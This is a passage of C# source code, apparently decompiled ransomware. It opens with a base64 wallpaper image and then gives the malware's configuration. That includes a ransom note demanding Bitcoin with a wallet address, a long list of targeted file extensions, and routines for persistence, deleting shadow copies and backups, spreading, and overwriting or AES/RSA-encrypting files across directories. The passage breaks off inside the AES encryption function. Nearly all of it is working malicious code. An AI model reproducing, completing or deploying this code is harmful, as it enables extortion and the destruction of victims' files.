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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $25.00 Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0,000027 BTC", "Bitcoin Address:  bc1qy7ymfa7cftkmcpzm6jm597hzjy0z8t8a8zmmt5", ""
	};

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>mjrX98H721rIdhTiB7AA96hHsALig/y2PJS3+GbSIakaVF9J45a/pzgOJcGdEu49YhRSLhoxbbU1zo3F+0BpVt3Yrkqo2gAetn1mGefFq31dAjKNYH/yqqrHXGJj73UQ0VPnr4e2peNAv9+oDmMBjw4nMYRj4Isx49ZcQ+/uoKE=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
